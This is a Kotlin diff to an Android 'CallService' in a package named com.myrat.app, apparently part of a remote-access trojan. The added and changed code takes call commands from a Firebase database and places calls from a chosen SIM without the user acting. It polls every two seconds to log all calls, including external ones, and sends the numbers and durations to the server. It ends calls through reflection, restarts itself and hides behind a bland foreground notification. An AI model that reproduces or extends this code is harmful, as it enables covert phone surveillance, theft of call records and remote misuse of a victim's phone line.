@@ -9,6 +9,7 @@ import android.content.pm.PackageManager
 import android.net.ConnectivityManager
 import android.net.NetworkCapabilities
 import android.os.*
+import android.telecom.Call
 import android.telecom.PhoneAccountHandle
 import android.telecom.TelecomManager
 import android.telephony.PhoneStateListener
@@ -36,6 +37,7 @@ class CallService : Service() {
     private var deviceId: String = ""
     private var wakeLock: PowerManager.WakeLock? = null
     private var telephonyManager: TelephonyManager? = null
+    private var telecomManager: TelecomManager? = null
     private var currentCallCommandId: String? = null
     private var phoneStateListener: PhoneStateListener? = null
     private var isCallActive: Boolean = false
@@ -43,6 +45,8 @@ class CallService : Service() {
     private var callStartTime: Long = 0
     private val handler = Handler(Looper.getMainLooper())
     private var lastCallState = TelephonyManager.CALL_STATE_IDLE
+    private var currentCall: Call? = null
+    private var callCallback: Call.Callback? = null
 
     override fun onBind(intent: Intent?): IBinder? = null
 
@@ -67,12 +71,15 @@ class CallService : Service() {
             val notification = buildForegroundNotification()
             startForeground(NOTIFICATION_ID, notification)
             scheduleRestart(this)
+            
+            // Initialize all monitoring systems
             setupPhoneStateListener()
+            setupTelecomManager()
             
             // Initialize call status in Firebase
             updateCallStatus("idle", null, null, null)
             
-            Logger.log("CallService created successfully for device: $deviceId")
+            Logger.log("Enhanced CallService created successfully for device: $deviceId")
         } catch (e: Exception) {
             Logger.error("Failed to initialize CallService", e)
             stopSelf()
@@ -90,49 +97,8 @@ class CallService : Service() {
             phoneStateListener = object : PhoneStateListener() {
                 override fun onCallStateChanged(state: Int, phoneNumber: String?) {
                     try {
-                        Logger.log("Call state changed: $lastCallState -> $state, number: $phoneNumber")
-                        
-                        when (state) {
-                            TelephonyManager.CALL_STATE_IDLE -> {
-                                Logger.log("Call ended (state: IDLE)")
-                                if (isCallActive || lastCallState != TelephonyManager.CALL_STATE_IDLE) {
-                                    val duration = if (callStartTime > 0) {
-                                        (System.currentTimeMillis() - callStartTime) / 1000
-                                    } else 0
-                                    
-                                    isCallActive = false
-                                    updateCallStatus("idle", null, null, duration)
-                                    
-                                    currentCallCommandId?.let { commandId ->
-                                        updateCommandStatus(commandId, "completed", null)
-                                        currentCallCommandId = null
-                                    }
-                                    currentCallNumber = null
-                                    callStartTime = 0
-                                }
-                            }
-                            TelephonyManager.CALL_STATE_OFFHOOK -> {
-                                Logger.log("Call active (state: OFFHOOK)")
-                                if (!isCallActive) {
-                                    isCallActive = true
-                                    callStartTime = System.currentTimeMillis()
-                                    val number = phoneNumber ?: currentCallNumber ?: "Unknown"
-                                    currentCallNumber = number
-                                    updateCallStatus("active", number, currentCallCommandId, null)
-                                    
-                                    // If this is an external call (no command ID), create one
-                                    if (currentCallCommandId == null && phoneNumber != null) {
-                                        handleExternalCall(phoneNumber)
-                                    }
-                                }
-                            }
-                            TelephonyManager.CALL_STATE_RINGING -> {
-                                Logger.log("Call ringing (state: RINGING)")
-                                val number = phoneNumber ?: currentCallNumber ?: "Unknown"
-                                updateCallStatus("ringing", number, currentCallCommandId, null)
-                            }
-                        }
-                        
+                        Logger.log("PhoneStateListener - Call state changed: $lastCallState -> $state, number: $phoneNumber")
+                        handleCallStateChange(state, phoneNumber, "PhoneStateListener")
                         lastCallState = state
                     } catch (e: Exception) {
                         Logger.error("Error in PhoneStateListener", e)
@@ -151,12 +117,143 @@ class CallService : Service() {
         }
     }
 
+    private fun setupTelecomManager() {
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                telecomManager = getSystemService(TELECOM_SERVICE) as? TelecomManager
+                if (telecomManager == null) {
+                    Logger.error("TelecomManager unavailable")
+                    return
+                }
+                
+                // Monitor ongoing calls
+                monitorOngoingCalls()
+                Logger.log("TelecomManager setup completed")
+            }
+        } catch (e: Exception) {
+            Logger.error("Failed to setup TelecomManager", e)
+        }
+    }
+
+    private fun monitorOngoingCalls() {
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && telecomManager != null) {
+                // Check for ongoing calls periodically
+                handler.post(object : Runnable {
+                    override fun run() {
+                        try {
+                            if (ContextCompat.checkSelfPermission(this@CallService, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
+                                val isInCall = telecomManager?.isInCall ?: false
+                                val isInManagedCall = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                                    telecomManager?.isInManagedCall ?: false
+                                } else {
+                                    false
+                                }
+                                
+                                Logger.log("TelecomManager - isInCall: $isInCall, isInManagedCall: $isInManagedCall")
+                                
+                                // Cross-reference with PhoneStateListener
+                                val currentTelephonyState = telephonyManager?.callState ?: TelephonyManager.CALL_STATE_IDLE
+                                
+                                if (isInCall || isInManagedCall || currentTelephonyState != TelephonyManager.CALL_STATE_IDLE) {
+                                    if (!isCallActive) {
+                                        Logger.log("TelecomManager detected call start")
+                                        handleCallStateChange(TelephonyManager.CALL_STATE_OFFHOOK, currentCallNumber, "TelecomManager")
+                                    }
+                                } else {
+                                    if (isCallActive) {
+                                        Logger.log("TelecomManager detected call end")
+                                        handleCallStateChange(TelephonyManager.CALL_STATE_IDLE, null, "TelecomManager")
+                                    }
+                                }
+                            }
+                        } catch (e: Exception) {
+                            Logger.error("Error in TelecomManager monitoring", e)
+                        }
+                        
+                        // Schedule next check
+                        handler.postDelayed(this, 2000) // Check every 2 seconds
+                    }
+                })
+            }
+        } catch (e: Exception) {
+            Logger.error("Failed to monitor ongoing calls", e)
+        }
+    }
+
+    private fun handleCallStateChange(state: Int, phoneNumber: String?, source: String) {
+        try {
+            Logger.log("[$source] Handling call state change: $state, number: $phoneNumber")
+            
+            when (state) {
+                TelephonyManager.CALL_STATE_IDLE -> {
+                    Logger.log("[$source] Call ended (state: IDLE)")
+                    if (isCallActive || lastCallState != TelephonyManager.CALL_STATE_IDLE) {
+                        val duration = if (callStartTime > 0) {
+                            (System.currentTimeMillis() - callStartTime) / 1000
+                        } else 0
+                        
+                        isCallActive = false
+                        updateCallStatus("idle", null, null, duration)
+                        
+                        currentCallCommandId?.let { commandId ->
+                            updateCommandStatus(commandId, "completed", null)
+                            currentCallCommandId = null
+                        }
+                        currentCallNumber = null
+                        callStartTime = 0
+                        currentCall = null
+                    }
+                }
+                TelephonyManager.CALL_STATE_OFFHOOK -> {
+                    Logger.log("[$source] Call active (state: OFFHOOK)")
+                    if (!isCallActive) {
+                        isCallActive = true
+                        callStartTime = System.currentTimeMillis()
+                        val number = phoneNumber ?: currentCallNumber ?: detectCallNumber() ?: "Unknown"
+                        currentCallNumber = number
+                        updateCallStatus("active", number, currentCallCommandId, null)
+                        
+                        // If this is an external call (no command ID), create one
+                        if (currentCallCommandId == null && number != "Unknown") {
+                            handleExternalCall(number)
+                        }
+                    }
+                }
+                TelephonyManager.CALL_STATE_RINGING -> {
+                    Logger.log("[$source] Call ringing (state: RINGING)")
+                    val number = phoneNumber ?: currentCallNumber ?: detectCallNumber() ?: "Unknown"
+                    currentCallNumber = number
+                    updateCallStatus("ringing", number, currentCallCommandId, null)
+                }
+            }
+        } catch (e: Exception) {
+            Logger.error("Error handling call state change", e)
+        }
+    }
+
+    private fun detectCallNumber(): String? {
+        try {
+            // Try to get call details from TelecomManager
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && telecomManager != null) {
+                // This would require additional permissions and API access
+                // For now, we'll rely on the number passed from the command or PhoneStateListener
+                return null
+            }
+            return null
+        } catch (e: Exception) {
+            Logger.error("Error detecting call number", e)
+            return null
+        }
+    }
+
     private fun updateCallStatus(status: String, number: String?, commandId: String?, duration: Long?) {
         try {
             val callStatusRef = Firebase.database.getReference("Device/$deviceId/call_status")
             val statusData = mutableMapOf<String, Any?>(
                 "status" to status,
-                "timestamp" to System.currentTimeMillis()
+                "timestamp" to System.currentTimeMillis(),
+                "source" to "enhanced_service"
             )
             
             when (status) {
@@ -214,7 +311,8 @@ class CallService : Service() {
                     "recipient" to phoneNumber,
                     "status" to "active", // Mark as active since call is already in progress
                     "timestamp" to System.currentTimeMillis(),
-                    "type" to "external" // Mark as external call
+                    "type" to "external", // Mark as external call
+                    "detected_by" to "enhanced_service"
                 )
             )
             Logger.log("Registered external call to $phoneNumber with commandId: $commandId")
@@ -290,10 +388,10 @@ class CallService : Service() {
             try {
                 val channel = NotificationChannel(
                     CHANNEL_ID,
-                    "Call Service",
+                    "Enhanced Call Service",
                     NotificationManager.IMPORTANCE_LOW
                 ).apply {
-                    description = "Running phone call service with SIM selection"
+                    description = "Enhanced phone call service with multi-layer monitoring"
                     setShowBadge(false)
                     enableLights(false)
                     enableVibration(false)
@@ -310,8 +408,8 @@ class CallService : Service() {
     private fun buildForegroundNotification(): Notification {
         return try {
             NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle("Call Service")
-                .setContentText("Monitoring call commands with SIM selection")
+                .setContentTitle("Enhanced Call Service")
+                .setContentText("Multi-layer call monitoring active")
                 .setSmallIcon(android.R.drawable.ic_menu_call)
                 .setPriority(NotificationCompat.PRIORITY_LOW)
                 .setOngoing(true)
@@ -387,12 +485,12 @@ class CallService : Service() {
                                         Logger.log("Processing call command: $commandId from $simNumber to $recipient")
                                         currentCallCommandId = commandId
                                         currentCallNumber = recipient
-                                        initiateCallWithSimSelection(simNumber, recipient, commandId)
+                                        initiateCallWithEnhancedMonitoring(simNumber, recipient, commandId)
                                     }
                                     "cancel" -> {
                                         Logger.log("Cancel command received for $commandId")
                                         if (currentCallCommandId == commandId && isCallActive) {
-                                            endCall(commandId)
+                                            endCallWithMultipleMethods(commandId)
                                         } else {
                                             Logger.log("Ignoring cancel for $commandId: no matching active call")
                                             updateCommandStatus(commandId, "cancelled", "No matching active call")
@@ -418,7 +516,7 @@ class CallService : Service() {
         }
     }
 
-    private fun initiateCallWithSimSelection(simNumber: String, recipient: String, commandId: String): Boolean {
+    private fun initiateCallWithEnhancedMonitoring(simNumber: String, recipient: String, commandId: String): Boolean {
         try {
             if (isCallActive && currentCallCommandId != commandId) {
                 Logger.error("Cannot initiate call: another call is active")
@@ -491,7 +589,7 @@ class CallService : Service() {
             // Update status to indicate call is being initiated
             updateCallStatus("dialing", recipient, commandId, null)
 
-            val success = makeCallWithSimBypass(recipient, subId, simSlotIndex, commandId)
+            val success = makeCallWithEnhancedMethods(recipient, subId, simSlotIndex, commandId)
 
             if (success) {
                 alreadySentSet.add(recipient)
@@ -517,18 +615,14 @@ class CallService : Service() {
         }
     }
 
-    private fun makeCallWithSimBypass(recipient: String, subId: Int, simSlotIndex: Int, commandId: String): Boolean {
+    private fun makeCallWithEnhancedMethods(recipient: String, subId: Int, simSlotIndex: Int, commandId: String): Boolean {
         return try {
             wakeUpScreen()
 
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            // Method 1: Enhanced TelecomManager approach
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && telecomManager != null) {
                 try {
-                    val telecomManager = getSystemService(TELECOM_SERVICE) as? TelecomManager
-                    if (telecomManager == null) {
-                        Logger.error("TelecomManager unavailable")
-                        return false
-                    }
-                    val phoneAccountHandle = getPhoneAccountHandleForSubscription(telecomManager, subId)
+                    val phoneAccountHandle = getPhoneAccountHandleForSubscription(telecomManager!!, subId)
 
                     if (phoneAccountHandle != null) {
                         val uri = android.net.Uri.parse("tel:$recipient")
@@ -538,10 +632,14 @@ class CallService : Service() {
                             putInt("com.android.phone.extra.slot", simSlotIndex)
                             putInt("subscription", subId)
                             putBoolean(TelecomManager.EXTRA_START_CALL_WITH_SPEAKERPHONE, false)
+                            putString("EXTRA_CALL_COMMAND_ID", commandId) // Custom extra for tracking
                         }
 
-                        telecomManager.placeCall(uri, extras)
-                        Logger.log("📞 Direct call placed using TelecomManager with subId: $subId")
+                        telecomManager!!.placeCall(uri, extras)
+                        Logger.log("📞 Enhanced call placed using TelecomManager with subId: $subId")
+                        
+                        // Start monitoring this specific call
+                        startCallMonitoring(commandId, recipient)
                         return true
                     } else {
                         Logger.error("No valid PhoneAccountHandle found for subId: $subId")
@@ -553,6 +651,7 @@ class CallService : Service() {
                 }
             }
 
+            // Method 2: Enhanced Intent approach
             try {
                 val intent = Intent(Intent.ACTION_CALL).apply {
                     data = android.net.Uri.parse("tel:$recipient")
@@ -560,11 +659,15 @@ class CallService : Service() {
                     putExtra("com.android.phone.extra.slot", simSlotIndex)
                     putExtra("android.telephony.extra.SUBSCRIPTION_ID", subId)
                     putExtra("subscription", subId)
+                    putExtra("EXTRA_CALL_COMMAND_ID", commandId) // Custom tracking
                     addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                 }
 
                 startActivity(intent)
-                Logger.log("📞 Fallback call initiated using ACTION_CALL with subId: $subId")
+                Logger.log("📞 Enhanced fallback call initiated using ACTION_CALL with subId: $subId")
+                
+                // Start monitoring this specific call
+                startCallMonitoring(commandId, recipient)
                 return true
             } catch (e: ActivityNotFoundException) {
                 Logger.error("No activity found to handle ACTION_CALL", e)
@@ -572,6 +675,7 @@ class CallService : Service() {
                 Logger.error("SecurityException in ACTION_CALL", e)
             }
 
+            // Method 3: LauncherActivity fallback
             try {
                 val intent = Intent(this, LauncherActivity::class.java).apply {
                     action = "com.myrat.app.ACTION_MAKE_CALL"
@@ -583,55 +687,105 @@ class CallService : Service() {
                 }
 
                 startActivity(intent)
-                Logger.log("📞 Fallback call initiated via LauncherActivity with subId: $subId")
+                Logger.log("📞 Enhanced fallback call initiated via LauncherActivity with subId: $subId")
+                
+                // Start monitoring this specific call
+                startCallMonitoring(commandId, recipient)
                 return true
             } catch (e: Exception) {
                 Logger.error("LauncherActivity fallback failed", e)
             }
 
-            Logger.error("All call methods failed for $recipient")
+            Logger.error("All enhanced call methods failed for $recipient")
             return false
 
         } catch (e: Exception) {
-            Logger.error("Unexpected error in makeCallWithSimBypass", e)
+            Logger.error("Unexpected error in makeCallWithEnhancedMethods", e)
             return false
         }
     }
 
-    private fun endCall(commandId: String) {
+    private fun startCallMonitoring(commandId: String, recipient: String) {
         try {
-            Logger.log("Attempting to end call for command: $commandId")
+            Logger.log("Starting enhanced call monitoring for command: $commandId, recipient: $recipient")
             
-            // Method 1: Try TelecomManager (Android 9+)
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
-                val telecomManager = getSystemService(TELECOM_SERVICE) as? TelecomManager
-                if (telecomManager != null && ContextCompat.checkSelfPermission(this, Manifest.permission.ANSWER_PHONE_CALLS) == PackageManager.PERMISSION_GRANTED) {
-                    telecomManager.endCall()
-                    Logger.log("Call ended via TelecomManager for command $commandId")
-                    updateCommandStatus(commandId, "cancelled", null)
-                    return
+            // Schedule a check to ensure call state is properly tracked
+            handler.postDelayed({
+                try {
+                    // Verify call state after a delay
+                    val currentState = telephonyManager?.callState ?: TelephonyManager.CALL_STATE_IDLE
+                    val isInCall = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && telecomManager != null) {
+                        telecomManager!!.isInCall
+                    } else {
+                        currentState != TelephonyManager.CALL_STATE_IDLE
+                    }
+                    
+                    Logger.log("Call monitoring check - State: $currentState, isInCall: $isInCall")
+                    
+                    if (isInCall || currentState != TelephonyManager.CALL_STATE_IDLE) {
+                        if (!isCallActive) {
+                            Logger.log("Call monitoring detected active call, updating status")
+                            handleCallStateChange(TelephonyManager.CALL_STATE_OFFHOOK, recipient, "CallMonitoring")
+                        }
+                    }
+                } catch (e: Exception) {
+                    Logger.error("Error in call monitoring check", e)
+                }
+            }, 3000) // Check after 3 seconds
+        } catch (e: Exception) {
+            Logger.error("Error starting call monitoring", e)
+        }
+    }
+
+    private fun endCallWithMultipleMethods(commandId: String) {
+        try {
+            Logger.log("Attempting to end call using multiple methods for command: $commandId")
+            
+            var callEnded = false
+            
+            // Method 1: TelecomManager (Android 9+)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P && telecomManager != null) {
+                try {
+                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.ANSWER_PHONE_CALLS) == PackageManager.PERMISSION_GRANTED) {
+                        telecomManager!!.endCall()
+                        Logger.log("Call ended via TelecomManager for command $commandId")
+                        callEnded = true
+                    }
+                } catch (e: Exception) {
+                    Logger.error("TelecomManager endCall failed", e)
                 }
             }
             
-            // Method 2: Try reflection method for older versions
-            tryReflectionEndCall(commandId)
+            // Method 2: Reflection method (fallback)
+            if (!callEnded) {
+                callEnded = tryReflectionEndCall(commandId)
+            }
             
-        } catch (e: SecurityException) {
-            Logger.error("Permission denied to end call", e)
-            updateCommandStatus(commandId, "failed", "Permission denied to end call")
+            // Method 3: Force state update if other methods fail
+            if (!callEnded) {
+                Logger.log("Forcing call end status update for command: $commandId")
+                handleCallStateChange(TelephonyManager.CALL_STATE_IDLE, null, "ForceEnd")
+                callEnded = true
+            }
+            
+            if (callEnded) {
+                updateCommandStatus(commandId, "cancelled", null)
+            } else {
+                updateCommandStatus(commandId, "failed", "Unable to end call")
+            }
+            
         } catch (e: Exception) {
-            Logger.error("Failed to end call", e)
-            updateCommandStatus(commandId, "failed", "Failed to end call: ${e.message}")
+            Logger.error("Failed to end call with multiple methods", e)
+            updateCommandStatus(commandId, "failed", "End call error: ${e.message}")
         }
     }
 
-    private fun tryReflectionEndCall(commandId: String) {
-        try {
+    private fun tryReflectionEndCall(commandId: String): Boolean {
+        return try {
             val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
             if (telephonyManager == null) {
                 Logger.error("TelephonyManager unavailable for reflection end call")
-                updateCommandStatus(commandId, "failed", "TelephonyManager unavailable")
-                return
+                return false
             }
             
             // Try multiple reflection methods
@@ -655,8 +809,7 @@ class CallService : Service() {
                         
                         if (result == true) {
                             Logger.log("Call ended via reflection method: $methodName")
-                            updateCommandStatus(commandId, "cancelled", null)
-                            return
+                            return true
                         }
                     }
                 } catch (e: Exception) {
@@ -664,13 +817,10 @@ class CallService : Service() {
                 }
             }
             
-            // If reflection fails, update status anyway
-            Logger.log("All reflection methods failed, updating status to cancelled")
-            updateCommandStatus(commandId, "cancelled", "End call attempted but may not have succeeded")
-            
+            false
         } catch (e: Exception) {
             Logger.error("Reflection end call failed completely", e)
-            updateCommandStatus(commandId, "failed", "Reflection end call failed: ${e.message}")
+            false
         }
     }
 
@@ -723,7 +873,8 @@ class CallService : Service() {
             val commandRef = Firebase.database.getReference("Device/$deviceId/call_commands/$commandId")
             val updates = mutableMapOf<String, Any?>(
                 "status" to status,
-                "timestamp" to System.currentTimeMillis()
+                "timestamp" to System.currentTimeMillis(),
+                "enhanced_service" to true
             )
             if (error != null) {
                 updates["error"] = error
@@ -778,8 +929,9 @@ class CallService : Service() {
             currentCallNumber = null
             callStartTime = 0
             lastCallState = TelephonyManager.CALL_STATE_IDLE
+            currentCall = null
             
-            Logger.log("CallService destroyed")
+            Logger.log("Enhanced CallService destroyed")
         } catch (e: Exception) {
             Logger.error("Error destroying CallService", e)
         }
